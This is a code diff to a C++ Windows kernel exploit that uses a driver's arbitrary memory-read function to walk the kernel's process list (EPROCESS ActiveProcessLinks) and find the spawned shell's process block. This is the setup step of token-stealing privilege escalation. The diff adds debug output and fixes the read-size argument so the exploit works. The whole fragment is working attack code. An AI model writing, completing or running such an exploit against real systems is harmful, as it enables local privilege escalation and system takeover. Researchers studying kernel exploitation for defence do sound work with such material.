@@ -116,6 +116,8 @@ int main() {
     // Save the PID for later.
     DWORD OurShellPID = pi.dwProcessId;
 
+    std::cout << "[-] Our shell's PID: " << OurShellPID << std::endl;
+
     // Initiate our variables.
     LIST_ENTRY activeProcessLinkList;
     uint64_t NextProcessEPROCESSBlock = PsInitialSystemProcessEPROCESS;
@@ -127,15 +129,16 @@ int main() {
     );
     // You can fetch every single process' EPROCESS block from this original Kernel list, we iterate through it till we find our shell's PID.
     while (true) {
-        DWORD processPID = 0;
+        DWORD processPID;
         NextProcessEPROCESSBlock = (uint64_t) activeProcessLinkList.Flink - ActiveProcessLinksOffset;
         // Fetch PID and compare it
         Driver.read_memory_raw(
-                (void *) (NextProcessEPROCESSBlock + PIDOffset),
+                (void *)(NextProcessEPROCESSBlock + PIDOffset),
                 &processPID,
-                (processPID),
+                sizeof(processPID),
                 processHandle
         );
+        // std::cout << "Found PID: " << processPID << std::dec << " With EPROCESS Addr: " << std::hex << NextProcessEPROCESSBlock << std::dec << std::endl;
         if (processPID == OurShellPID) {
             std::cout << "[>] Found our shell's EPROCESS address: " << std::hex << NextProcessEPROCESSBlock << std::dec
                       << std::endl;
